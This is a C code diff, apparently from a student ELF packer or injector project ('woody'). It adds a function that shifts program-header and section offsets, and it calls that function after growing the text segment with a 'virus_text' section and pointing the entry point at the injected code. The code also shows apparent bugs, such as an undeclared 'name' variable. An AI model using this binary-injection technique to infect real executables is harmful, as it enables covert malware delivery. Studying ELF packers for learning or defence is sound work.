@@ -123,6 +123,61 @@ void	debugg(char *str, unsigned int size)
 	printf("\n");
 }
 
+//size doit être signé
+void	change_offset(void *ptr, unsigned int v_size, int sign)
+{
+	//change segments
+	Elf64_Ehdr *elf_hdr = (void *)ptr;
+    Elf64_Phdr *elf_seg, *text_seg;
+	int         n_seg = elf_hdr->e_phnum;
+	int			size = v_size;
+	if (sign < 0)
+		size *= -1;
+	size_t i = 0;
+
+	elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr->e_phoff);
+	while (i < n_seg)
+    {
+        if (elf_seg->p_type == PT_LOAD && elf_seg->p_flags & 0x011)
+			break;
+		i++;
+		elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg + (unsigned int) elf_hdr->e_phentsize);			
+	}
+	
+	i++;
+	elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg + (unsigned int) elf_hdr->e_phentsize);
+	
+	while (i < n_seg)
+	{
+		elf_seg->p_offset += size;
+		i++;
+		elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg + (unsigned int) elf_hdr->e_phentsize);			
+	}
+
+	//change sections
+	Elf64_Shdr *section;
+	uint8_t *data;
+	char *sectname;
+
+	i = 0;
+	data = ptr;
+    elf_hdr = (void *)ptr;
+    section = (void *)elf_hdr + elf_hdr->e_shoff;	
+	sectname = (char*)(ptr + section[elf_hdr->e_shstrndx].sh_offset);
+	while (i < elf_hdr->e_shnum)
+	{
+		if (ft_strcmp(&sectname[section[i].sh_name], name) == 0 && section[i].sh_addr)
+			break;
+		i++;
+	}
+	i++;
+	while (i < elf_hdr->e_shnum)
+	{
+		section[i].sh_offset += size;
+		i++;
+	}
+}
+
 void	woody_start(void *ptr, unsigned int size, int fd)
 {
 	int text_end = 0;
@@ -151,6 +206,8 @@ void	woody_start(void *ptr, unsigned int size, int fd)
 	t_text_seg->p_memsz += virus_text->sh_size;
 	t_text_seg->p_filesz += virus_text->sh_size;
 	header->e_entry = (Elf64_Addr) (base + text_end);
+	//declaller offsets des sections autres
+	change_offset(ptr, virus_text->sh_size, -1);
 	
 	
 	printf ("+ Payload .text section found at %llx (%llx bytes)\n", 
